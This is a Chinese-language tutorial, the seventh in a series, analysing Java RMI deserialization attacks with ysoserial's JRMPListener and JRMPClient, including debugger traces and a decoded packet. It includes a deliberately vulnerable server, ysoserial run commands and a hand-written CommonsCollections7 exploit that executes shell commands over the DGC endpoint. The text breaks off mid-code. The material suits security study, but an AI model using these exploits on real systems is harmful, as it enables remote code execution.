@@ -1,0 +1,1185 @@
+﻿标题: Java RMI入门(7)
+
+创建: 2020-04-10 10:18
+更新: 2020-04-13 21:42
+链接: http://scz.617.cn:8/network/202004101018.txt
+
+--------------------------------------------------------------------------
+
+目录:
+
+    ☆ 前言
+    ☆ ysoserial.payloads.JRMPListener+ysoserial.exploit.JRMPClient
+        1) VulnerableServer2.java
+        2) ysoserial.payloads.JRMPListener
+            2.1) 简化版调用关系
+        3) ysoserial.exploit.JRMPClient
+            3.1) 简化版调用关系(重点看这个)
+            3.2) 相关源码
+            3.3) 网络通信报文
+        4) EvilClientWithUnicastRemoteObject.java
+            4.1) UnicastRemoteObjectTest.java
+        5) DGCClientWithHashtable.java
+        6) 测试
+        7) 8u232为什么失败(有白名单检查)
+        8) 用DGCClientWithHashtable打常规RMI动态端口
+        9) 用DGCClientWithHashtable打常规RMI周知端口
+    ☆ 参考资源
+
+--------------------------------------------------------------------------
+
+☆ 前言
+
+参看
+
+《Java RMI入门》
+http://scz.617.cn:8/network/202002221000.txt
+
+《Java RMI入门(2)》
+http://scz.617.cn:8/network/202003081810.txt
+
+《Java RMI入门(3)》
+http://scz.617.cn:8/network/202003121717.txt
+
+《Java RMI入门(4)》
+http://scz.617.cn:8/network/202003191728.txt
+
+《Java RMI入门(5)》
+http://scz.617.cn:8/network/202003241127.txt
+
+《Java RMI入门(6)》
+http://scz.617.cn:8/network/202004011650.txt
+
+《Java RMI入门(8)》
+http://scz.617.cn:8/network/202004141657.txt
+
+☆ ysoserial.payloads.JRMPListener+ysoserial.exploit.JRMPClient
+
+ysoserial.payloads.JRMPListener会产生一种序列化数据，当存在漏洞的目标反序
+列化它们时，会侦听一个RMI动态端口。"ysoserial/CommonsCollections*"系列产生
+另一类序列化数据，当存在漏洞的目标反序列化它们时，会执行恶意命令。这么讲你
+就明白ysoserial.payloads.JRMPListener的地位了。
+
+ysoserial.exploit.JRMPClient可以用来攻击RMI动态端口。从这个意义上讲，二者
+是一对。但ysoserial.exploit.JRMPClient与ysoserial.payloads.JRMPListener
+没有必然联系，ysoserial.exploit.JRMPClient可以攻击任何已经存在的RMI周知端
+口、动态端口。
+
+ysoserial.payloads.JRMPClient和ysoserial.exploit.JRMPListener是另一对，从
+名字上看很容易跟前一对搞混，要仔细些。
+
+另一个对比是，ysoserial.exploit.JRMPClient可以打RMI周知端口、动态端口，而
+ysoserial.exploit.RMIRegistryExploit只能打RMI周知端口。
+
+1) VulnerableServer2.java
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g VulnerableServer2.java
+ */
+import java.io.*;
+import java.net.*;
+
+public class VulnerableServer2
+{
+    public static void main ( String[] argv ) throws Exception
+    {
+        String          addr        = argv[0];
+        int             port        = Integer.parseInt( argv[1] );
+        InetAddress     bindAddr    = InetAddress.getByName( addr );
+        /*
+         * https://docs.oracle.com/javase/8/docs/api/java/net/ServerSocket.html
+         */
+        ServerSocket    s_listen    = new ServerSocket( port, 0, bindAddr );
+        while ( true )
+        {
+            Socket              s_accept    = s_listen.accept();
+            ObjectInputStream   ois         = new ObjectInputStream( s_accept.getInputStream() );
+            Object              obj         = ois.readObject();
+            /*
+             * 是为了测试ysoserial.payloads.JRMPListener而故意增加的，否则
+             * 有点古怪。假设没有这句，只能在挂着调试器运行的情况下得手，
+             * 不需要有断点命中，只需要挂着调试器运行即可。难道有什么时间
+             * 相关的竞争条件问题存在？
+             */
+            System.in.read();
+            ois.close();
+            s_accept.close();
+        }
+    }
+}
+--------------------------------------------------------------------------
+
+原本用VulnerableServer.java测试ysoserial.payloads.JRMPListener，发现有古怪。
+只能在挂着调试器运行VulnerableServer的情况下得手，不需要有断点命中，只需要
+挂着调试器运行即可。怀疑有时间相关的竞争条件问题存在，未深究。挂着调试器运
+行VulnerableServer，最大的影响就是执行变缓，基于这种思路，改出
+VulnerableServer2.java，通过读stdin产生额外阻塞，果然可以得手。
+
+2) ysoserial.payloads.JRMPListener
+
+参[52]
+
+https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPListener.java
+
+java VulnerableServer2 192.168.65.23 1414
+
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 1314 | nc -n 192.168.65.23 1414
+
+netstat -nltp | grep -E '(1314|1414)'
+
+这个payload并不试图直接执行恶意命令，而是在反序列过程中获得控制，在指定端
+口上侦听，这个端口的地位相当于RMI动态端口。
+
+本篇改变一下写作风格，先演示公开工具如何使用，再对之调试分析。
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+VulnerableServer2 192.168.65.23 1414
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in sun.rmi.transport.tcp.TCPTransport.listen
+stop in java.net.ServerSocket.bind(java.net.SocketAddress,int)
+stop in java.net.AbstractPlainSocketImpl.bind
+stop in java.net.AbstractPlainSocketImpl.listen
+monitor wherei
+
+已知有个端口要listen，之前肯定有bind，上面第二个断点是刚开始研究时下的断点，
+命中后单步跟踪，就找到其他几个关键函数。并不是用jdb调试的，是用Eclipse，但
+复盘时喜欢用jdb表达式，便于聚焦、描述。
+
+  [1] java.net.AbstractPlainSocketImpl.listen (AbstractPlainSocketImpl.java:399), pc = 0
+  [2] java.net.ServerSocket.bind (ServerSocket.java:391), pc = 140
+  [3] java.net.ServerSocket.<init> (ServerSocket.java:252), pc = 95
+  [4] java.net.ServerSocket.<init> (ServerSocket.java:143), pc = 5
+  [5] sun.rmi.transport.proxy.RMIDirectSocketFactory.createServerSocket (RMIDirectSocketFactory.java:45), pc = 5
+  [6] sun.rmi.transport.proxy.RMIMasterSocketFactory.createServerSocket (RMIMasterSocketFactory.java:345), pc = 5
+  [7] sun.rmi.transport.tcp.TCPEndpoint.newServerSocket (TCPEndpoint.java:666), pc = 58
+  [8] sun.rmi.transport.tcp.TCPTransport.listen (TCPTransport.java:335), pc = 85
+  [9] sun.rmi.transport.tcp.TCPTransport.exportObject (TCPTransport.java:254), pc = 5
+  [10] sun.rmi.transport.tcp.TCPEndpoint.exportObject (TCPEndpoint.java:411), pc = 5
+  [11] sun.rmi.transport.LiveRef.exportObject (LiveRef.java:147), pc = 5
+  [12] sun.rmi.server.UnicastServerRef.exportObject (UnicastServerRef.java:237), pc = 78
+  [13] java.rmi.server.UnicastRemoteObject.exportObject (UnicastRemoteObject.java:383), pc = 19
+  [14] java.rmi.server.UnicastRemoteObject.exportObject (UnicastRemoteObject.java:320), pc = 9
+  [15] java.rmi.server.UnicastRemoteObject.reexport (UnicastRemoteObject.java:266), pc = 19
+  [16] java.rmi.server.UnicastRemoteObject.readObject (UnicastRemoteObject.java:235), pc = 5
+  [17] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [18] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [19] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [20] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
+  [21] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
+  [22] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
+  [23] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
+  [24] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
+  [25] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
+  [26] VulnerableServer2.main (VulnerableServer2.java:22), pc = 51
+
+2.1) 简化版调用关系
+
+--------------------------------------------------------------------------
+ObjectInputStream.readObject                                    // 8u232
+  UnicastRemoteObject.readObject
+    UnicastRemoteObject.reexport
+      UnicastRemoteObject.exportObject                          // RMI编程时，动态端口部分如果不想"extends UnicastRemoteObject"
+                                                                // 就必须显式UnicastRemoteObject.exportObject()
+        UnicastServerRef.exportObject
+          LiveRef.exportObject
+            TCPEndpoint.exportObject
+              TCPTransport.exportObject
+                TCPTransport.listen                             // 这个listen()的含义很复杂，不只是TCP层的listen
+                  TCPEndpoint.newServerSocket                   // TCPTransport:335
+                    RMIMasterSocketFactory.createServerSocket
+                      RMIDirectSocketFactory.createServerSocket
+                        ServerSocket.<init>
+                          ServerSocket.bind                     // ServerSocket:252
+                                                                // 这个bind()实际包含了bind+listen
+                            AbstractPlainSocketImpl.bind        // ServerSocket:390
+                            AbstractPlainSocketImpl.listen      // ServerSocket:391
+                  new NewThreadAction(new AcceptLoop())         // TCPTransport:341
+                  t.start()                                     // TCPTransport:344
+                                                                // 单开一个线程去accept()
+--------------------------------------------------------------------------
+
+上述调用关系主要是讲UnicastRemoteObject.exportObject()在干什么。只不过不是
+显式调用的，而是对ysoserial.payloads.JRMPListener产生的payload反序列化时隐
+式调用的。简单点说，ysoserial.payloads.JRMPListener得手后侦听RMI动态端口。
+
+3) ysoserial.exploit.JRMPClient
+
+参[52]
+
+https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java
+
+java_8_40 \
+-cp "commons-collections-3.1.jar:." \
+VulnerableServer2 192.168.65.23 1414
+
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 1314 | nc -n 192.168.65.23 1414
+
+netstat -nltp | grep -E '(1314|1414)'
+
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.JRMPClient 192.168.65.23 1314 \
+CommonsCollections7 "/bin/touch /tmp/scz_is_here"
+
+如果用8u232跑VulnerableServer2，不会得手。
+
+java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-cp "commons-collections-3.1.jar:." \
+VulnerableServer2 192.168.65.23 1414
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in java.lang.Runtime.exec(java.lang.String)
+
+  [1] java.lang.Runtime.exec (Runtime.java:347), pc = 0
+  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [5] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
+  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
+  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
+  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
+  [9] java.util.AbstractMap.equals (AbstractMap.java:472), pc = 118
+  [10] org.apache.commons.collections.map.AbstractMapDecorator.equals (AbstractMapDecorator.java:129), pc = 12
+  [11] java.util.Hashtable.reconstitutionPut (Hashtable.java:1,221), pc = 55
+  [12] java.util.Hashtable.readObject (Hashtable.java:1,195), pc = 117
+  [13] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [14] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [15] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [16] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
+  [17] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
+  [18] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
+  [19] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
+  [20] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
+  [21] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
+  [22] sun.rmi.transport.DGCImpl_Skel.dispatch (null), pc = 201
+  [23] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:410), pc = 100
+  [24] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:268), pc = 31
+  [25] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
+  [26] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
+  [27] java.security.AccessController.doPrivileged (native method)
+  [28] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
+  [29] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:568), pc = 185
+  [30] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:790), pc = 441
+  [31] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78 (TCPTransport.java:683), pc = 1
+  [32] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.753727528.run (null), pc = 4
+  [33] java.security.AccessController.doPrivileged (native method)
+  [34] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:682), pc = 58
+  [35] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,142), pc = 95
+  [36] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:617), pc = 5
+  [37] java.lang.Thread.run (Thread.java:745), pc = 11
+
+3.1) 简化版调用关系(重点看这个)
+
+DGC是"Distributed Garbage Collection"的缩写，一种分布式垃圾收集机制。只要
+侦听RMI周知端口、动态端口，就有DGC在其中出现。
+
+参看:
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/sun/rmi/transport/TransportConstants.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/sun/rmi/transport/tcp/TCPTransport.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/sun/rmi/transport/Transport.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/java/rmi/server/UID.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/java/rmi/server/ObjID.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/sun/rmi/server/UnicastServerRef.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/DGCImpl_Skel.java
+
+强调一下，这主要是8u40-b26的调用关系，夹杂了一些8u232的变化。
+
+--------------------------------------------------------------------------
+TCPTransport$ConnectionHandler.run0                     // 8u40-b26
+  magic = in.readInt()                                  // TCPTransport:722
+                                                        // 读"JRMI"
+  version = in.readShort()                              // TCPTransport:749
+                                                        // 读0x0002
+  protocol = in.readByte()                              // TCPTransport:777
+                                                        // 读0x4c，SingleOpProtocol
+  TCPTransport.handleMessages                           // TCPTransport:790
+    op = in.read()                                      // TCPTransport:550
+                                                        // 读0x50，Call
+                                                        // 之前都是DataInputStream
+                                                        // 之后都是ObjectInputStream
+    Transport.serviceCall                               // TCPTransport:568
+      ObjID.read                                        // Transport:166
+                                                        // 依次读2、0、0、0
+        num = in.readLong()                             // Transport:191
+                                                        // 读2，ObjID.DGC_ID
+        UID.read                                        // Transport:192
+                                                        // 依次读0、0、0
+          unique = in.readInt()                         // UID:264
+          time = in.readLong()                          // UID:265
+          count = in.readShort()                        // UID:266
+      UnicastServerRef.dispatch                         // Transport:200
+        num = in.readInt()                              // UnicastServerRef:265
+                                                        // 读1，这是op
+        UnicastServerRef.oldDispatch                    // UnicastServerRef:268
+          hash = in.readLong()                          // UnicastServerRef:400
+                                                        // 读-669196253586618813L
+          DGCImpl_Skel.dispatch                         // UnicastServerRef:410
+                                                        // 这次不是RegistryImpl_Skel
+            ObjectInputStream.readObject                // case 1流程
+                                                        // dirty(ObjID[], long, Lease)
+              ObjectInputStream.readOrdinaryObject
+                ObjectInputStream.readClassDesc         // 8u40不用看这个流程
+                  ObjectInputStream.readNonProxyDesc
+                    ObjectInputStream.filterCheck       // 8u232
+                      DGCImpl.checkInput                // stop in sun.rmi.transport.DGCImpl.checkInput
+                        DGCImpl:409                     // 8u232，缺省情况下此处有白名单检查
+                                                        // 指定-Dsun.rmi.transport.dgcFilter='*'
+                                                        // 将通过此处检查
+                ObjectInputStream.readSerialData
+                  Hashtable.readObject                  // ysoserial/CommonsCollections7
+                    key = s.readObject()                // 8u40不用看这个流程
+                                                        // 假设指定-Dsun.rmi.transport.dgcFilter='*'
+                                                        // 8u232不会平安经过此处
+                      LazyMap.readObject
+                        ObjectInputStream.readHandle
+                          ObjectInputStream.filterCheck // 8u232，ObjectInputStream:1701
+                                                        // filterCheck(null, -1);
+                                                        // just a check for number of references, depth, no class
+                            DGCImpl.checkInput
+                              DGCImpl:386               // status = dgcFilter.checkInput(filterInfo)
+                                                        // ObjectInputFilter$Config$Global.checkInput
+                                ObjectInputFilter:642   // 8u232，返回UNDECIDED
+                              DGCImpl:393               // if (filterInfo.depth() > DGC_MAX_DEPTH)
+                                                        // filterInfo.depth()等于6，DGC_MAX_DEPTH等于5
+                                                        // 即使指定-Dsun.rmi.transport.dgcFilter='*'
+                                                        // 8u232也无法通过此处检查
+                              DGCImpl:394               // 8u232，返回REJECTED
+                    Hashtable.reconstitutionPut         // 8u40
+                      AbstractMapDecorator.equals
+                        AbstractMap.equals
+                          LazyMap.get                   // 此处开始LazyMap利用链
+                            ChainedTransformer.transform
+                              InvokerTransformer.transform
+                                Runtime.exec
+--------------------------------------------------------------------------
+
+调试分析过程比较枯燥，绝大多数人没必要去纠缠细节，如果想深究，参照上面的框
+架流程用GUI工具在感兴趣的位置设断，查看调用栈回溯中的各层源码。
+
+流程到达ObjectInputStream.readObject()之前有一堆Header信息需要读，这是一种
+私有协议。
+
+3.2) 相关源码
+
+找不到8u40-b26的DGCImpl_Skel.java，只好用JD-GUI反编译查看。
+
+--------------------------------------------------------------------------
+/*
+ * sun.rmi.transport.DGCImpl_Skel.dispatch
+ *
+ * 第3形参是op，第4形参是hash
+ */
+public void dispatch(Remote paramRemote, RemoteCall paramRemoteCall, int paramInt, long paramLong)
+  throws Exception
+{
+/*
+ * hash必须是这个值
+ */
+  if (paramLong != -669196253586618813L) {
+    throw new SkeletonMismatchException("interface hash mismatch");
+  }
+  DGCImpl localDGCImpl = (DGCImpl)paramRemote;
+  ObjID[] arrayOfObjID;
+  long l;
+  Object localObject1;
+/*
+ * op
+ */
+  switch (paramInt)
+  {
+/*
+ * clean(ObjID[], long, VMID, boolean)
+ */
+  case 0:
+    boolean bool;
+    try
+    {
+      ObjectInput localObjectInput2 = paramRemoteCall.getInputStream();
+/*
+ * 此处应该也可以用于攻击，op等于0的流程
+ */
+      arrayOfObjID = (ObjID[])localObjectInput2.readObject();
+      l = localObjectInput2.readLong();
+      localObject1 = (VMID)localObjectInput2.readObject();
+      bool = localObjectInput2.readBoolean();
+    }
+...
+/*
+ * dirty(ObjID[], long, Lease)
+ */
+  case 1:
+    try
+    {
+      ObjectInput localObjectInput1 = paramRemoteCall.getInputStream();
+/*
+ * ysoserial.exploit.JRMPClient至此
+ */
+      arrayOfObjID = (ObjID[])localObjectInput1.readObject();
+      l = localObjectInput1.readLong();
+      localObject1 = (Lease)localObjectInput1.readObject();
+    }
+...
+  default:
+    throw new UnmarshalException("invalid method number");
+  }
+}
+--------------------------------------------------------------------------
+
+3.3) 网络通信报文
+
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 192.168.65.23 1314 CommonsCollections7 "/bin/touch /tmp/scz_is_here"
+
+抓包
+
+ysoserial.exploit.JRMPClient.cap
+
+前面0x32字节如下:
+
+0000000: 4a 52 4d 49 00 02 4c 50 ac ed 00 05 77 22 00 00  JRMI..LP....w"..
+0000010: 00 00 00 00 00 02 00 00 00 00 00 00 00 00 00 00  ................
+0000020: 00 00 00 00 00 00 00 01 f6 b6 89 8d 8b f2 86 43  ...............C
+0000030: 73 72                                            sr
+
+手工解码如下:
+
+4a 52 4d 49             // magic
+00 02                   // version
+4c                      // protocol=SingleOpProtocol
+50                      // op=Call
+ac ed 00 05             // STREAM_MAGIC(0xaced) STREAM_VERSION(0x5)
+77 22                   // TC_BLOCKDATA(0x77) Length(0x22)
+00 00 00 00 00 00 00 02 // DataOutputStream.writeLong
+00 00 00 00             // DataOutputStream.writeInt
+00 00 00 00 00 00 00 00 // DataOutputStream.writeLong
+00 00                   // DataOutputStream.writeShort
+00 00 00 01             // DataOutputStream.writeInt
+f6 b6 89 8d 8b f2 86 43 // DataOutputStream.writeLong
+                        // 0xf6b6898d8bf28643(-669196253586618813L)
+73 72                   // TC_OBJECT(0x73) TC_CLASSDESC(0x72)
+...
+
+DataInputStream.write*()相当于TCP层裸写，ObjectInputStream.write*()则是序
+列化写。
+
+把[0x8,0x30)的数据截出来，可以用SerializationDumper.jar查看:
+
+java -jar SerializationDumper.jar -r tmp.bin
+
+STREAM_MAGIC - 0xac ed
+STREAM_VERSION - 0x00 05
+Contents
+  TC_BLOCKDATA - 0x77
+    Length - 34 - 0x22
+    Contents - 0x0000000000000002000000000000000000000000000000000001f6b6898d8bf28643
+
+4) EvilClientWithUnicastRemoteObject.java
+
+对应ysoserial.payloads.JRMPListener
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -XDignore.symbol.file EvilClientWithUnicastRemoteObject.java
+ * java EvilClientWithUnicastRemoteObject 192.168.65.23 1414 1314
+ *
+ * warning: UnicastServerRef is internal proprietary API and may be removed in a future release
+ *
+ * 为了抑制这个编译时警告，Java 8可以指定"-XDignore.symbol.file"
+ */
+import java.io.*;
+import java.lang.reflect.*;
+import java.net.Socket;
+import java.rmi.server.RemoteObject;
+import java.rmi.server.RemoteRef;
+import java.rmi.server.UnicastRemoteObject;
+import sun.rmi.server.UnicastServerRef;
+import sun.reflect.ReflectionFactory;
+
+public class EvilClientWithUnicastRemoteObject
+{
+    /*
+     * 适配YouDebug脚本
+     */
+    public static Object getObject ( int port ) throws Exception
+    {
+        /*
+         * https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
+         *
+         * Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes)
+         *
+         * RemoteObject是public的，可以直接import，所以不需要Class.forName()
+         *
+         * 也可以用RemoteServer.class.getDeclaredConstructor()
+         */
+        Constructor<?>      cons_0  = RemoteObject.class.getDeclaredConstructor( RemoteRef.class );
+        cons_0.setAccessible( true );
+        /*
+         * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/reflect/ReflectionFactory.java
+         *
+         * public static ReflectionFactory getReflectionFactory()
+         * public Constructor<?> newConstructorForSerialization (Class<?> classToInstantiate, Constructor<?> constructorToCall)
+         *
+         * 这个套路是说，初始化一个UnicastRemoteObject实例，但不要调
+         * UnicastRemoteObject自己的构造函数，而是调RemoteObject的构造函数。
+         * 因为UnicastRemoteObject自己的构造函数中会调用
+         * UnicastRemoteObject.exportObject()，我们不想看到这种局面。
+         */
+        Constructor<?>      cons_1  = ReflectionFactory.getReflectionFactory().newConstructorForSerialization
+        (
+            /*
+             * 为什么ysoserial.payloads.JRMPListener要用ActivationGroupImpl，
+             * 没有道理啊，直接用UnicastRemoteObject不是更好？
+             */
+            UnicastRemoteObject.class,
+            cons_0
+        );
+        cons_1.setAccessible( true );
+        UnicastRemoteObject uro     = ( UnicastRemoteObject )cons_1.newInstance
+        (
+            new UnicastServerRef( port )
+        );
+        Field               f       = UnicastRemoteObject.class.getDeclaredField( "port" );
+        f.setAccessible( true );
+        f.set( uro, port );
+        return( uro );
+    }
+
+    public static void main ( String[] argv ) throws Exception
+    {
+        String              addr        = argv[0];
+        int                 port        = Integer.parseInt( argv[1] );
+        /*
+         * 攻击得手后侦听的动态端口
+         */
+        int                 newport     = Integer.parseInt( argv[2] );
+        Object              obj         = getObject( newport );
+        Socket              s_connect   = new Socket( addr, port );
+        ObjectOutputStream  oos         = new ObjectOutputStream( s_connect.getOutputStream() );
+        oos.writeObject( obj );
+        oos.close();
+        s_connect.close();
+    }
+}
+--------------------------------------------------------------------------
+
+4.1) UnicastRemoteObjectTest.java
+
+不能用普通的反射方式调用UnicastRemoteObject的构造函数，因为其中会调用
+UnicastRemoteObject.exportObject()，直接开始listen()，显然数据准备阶段不想
+看到这种效果。我们希望看到的是在反序列化阶段触发listen()。
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -XDignore.symbol.file UnicastRemoteObjectTest.java
+ * java UnicastRemoteObjectTest 1314
+ */
+import java.io.*;
+import java.lang.reflect.*;
+import java.rmi.server.UnicastRemoteObject;
+
+public class UnicastRemoteObjectTest
+{
+    public static Object getObject ( int port ) throws Exception
+    {
+        /*
+         * https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
+         *
+         * Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes)
+         *
+         * UnicastRemoteObject是public的，可以直接import，所以不需要Class.forName()
+         */
+        Constructor<?>      cons    = UnicastRemoteObject.class.getDeclaredConstructor( int.class );
+        cons.setAccessible( true );
+        UnicastRemoteObject uro     = ( UnicastRemoteObject )cons.newInstance( port );
+        return( uro );
+    }
+
+    public static void main ( String[] argv ) throws Exception
+    {
+        int     port    = Integer.parseInt( argv[0] );
+        /*
+         * 在数据准备阶段直接开始listen()，非期望行为。
+         */
+        Object  obj     = getObject( port );
+        System.in.read();
+    }
+}
+--------------------------------------------------------------------------
+
+java UnicastRemoteObjectTest 1314
+
+netstat -nltp | grep -E '(1314|1414)'
+
+5) DGCClientWithHashtable.java
+
+对应ysoserial.exploit.JRMPClient，使用ysoserial/CommonsCollections7。
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -XDignore.symbol.file -cp "commons-collections-3.1.jar" DGCClientWithHashtable.java
+ * java -cp "commons-collections-3.1.jar:." DGCClientWithHashtable 192.168.65.23 1314 "/bin/touch /tmp/scz_is_here"
+ *
+ * warning: MarshalOutputStream is internal proprietary API and may be removed in a future release
+ *
+ * 为了抑制这个编译时警告，Java 8可以指定"-XDignore.symbol.file"
+ */
+import java.io.*;
+import java.util.*;
+import java.lang.reflect.*;
+import java.net.Socket;
+import sun.rmi.server.MarshalOutputStream;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.LazyMap;
+
+/*
+ * 从LazyMapExecWithHashtable2.java修改而来
+ */
+public class DGCClientWithHashtable
+{
+    @SuppressWarnings("unchecked")
+    public static Object getObject ( String cmd ) throws Exception
+    {
+        Transformer[]   tarray      = new Transformer[]
+        {
+            new ConstantTransformer( Runtime.class ),
+            new InvokerTransformer
+            (
+                "getMethod",
+                new Class[]
+                {
+                    String.class,
+                    Class[].class
+                },
+                new Object[]
+                {
+                    "getRuntime",
+                    new Class[0]
+                }
+            ),
+            new InvokerTransformer
+            (
+                "invoke",
+                new Class[]
+                {
+                    Object.class,
+                    Object[].class
+                },
+                new Object[]
+                {
+                    null,
+                    new Object[0]
+                }
+            ),
+            new InvokerTransformer
+            (
+                "exec",
+                new Class[]
+                {
+                    String[].class
+                },
+                new Object[]
+                {
+                    new String[]
+                    {
+                        "/bin/bash",
+                        "-c",
+                        cmd
+                    }
+                }
+            )
+        };
+        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
+        Map             normalMap_0 = new HashMap();
+        Map             normalMap_1 = new HashMap();
+        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
+        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
+        lazyMap_0.put( "scz", "same" );
+        lazyMap_1.put( "tDz", "same" );
+        Hashtable       ht          = new Hashtable();
+        ht.put( lazyMap_0, "value_0" );
+        ht.put( lazyMap_1, "value_1" );
+        lazyMap_1.remove( "scz" );
+        Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
+        f.setAccessible( true );
+        f.set( tchain, tarray );
+        return( ht );
+    }
+
+    private static void WriteHeader ( Socket s ) throws IOException
+    {
+        DataOutputStream    dos = new DataOutputStream( s.getOutputStream() );
+        /*
+         * "JRMI"
+         */
+        dos.writeInt( 0x4a524d49 );
+        dos.writeShort( 0x0002 );
+        /*
+         * SingleOpProtocol
+         */
+        dos.writeByte( 0x4c );
+        /*
+         * Call
+         */
+        dos.write( 0x50 );
+        /*
+         * 如果这里关dos，会把s一并关掉
+         *
+         * dos.close();
+         */
+    }
+
+    private static void WriteBody ( Socket s, Object obj ) throws IOException
+    {
+        /*
+         * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/MarshalOutputStream.java
+         *
+         * 本来应该用sun.rmi.transport.ConnectionOutputStream，但它不是
+         * public的，只好用它的父类sun.rmi.server.MarshalOutputStream。
+         * 这里不能直接用java.io.ObjectOutputStream。MarshalOutputStream重
+         * 载了annotateClass()，而ObjectOutputStream的annotateClass()是个
+         * 空函数，啥也没干。MarshalOutputStream重载的annotateProxyClass()
+         * 在本例中不会命中。MarshalOutputStream重载的replaceObject()在本
+         * 例中不会带来实际区别。
+         */
+        MarshalOutputStream mos = new MarshalOutputStream( s.getOutputStream() );
+        /*
+         * ObjID.DGC_ID
+         */
+        mos.writeLong( 2 );
+        /*
+         * unique
+         */
+        mos.writeInt( 0 );
+        /*
+         * time
+         */
+        mos.writeLong( 0 );
+        /*
+         * count
+         */
+        mos.writeShort( 0 );
+        /*
+         * op=1
+         *
+         * dirty(ObjID[], long, Lease)
+         */
+        mos.writeInt( 1 );
+        /*
+         * hash
+         */
+        mos.writeLong( -669196253586618813L );
+        mos.writeObject( obj );
+        mos.close();
+    }
+
+    public static void main ( String[] argv ) throws Exception
+    {
+        String  addr        = argv[0];
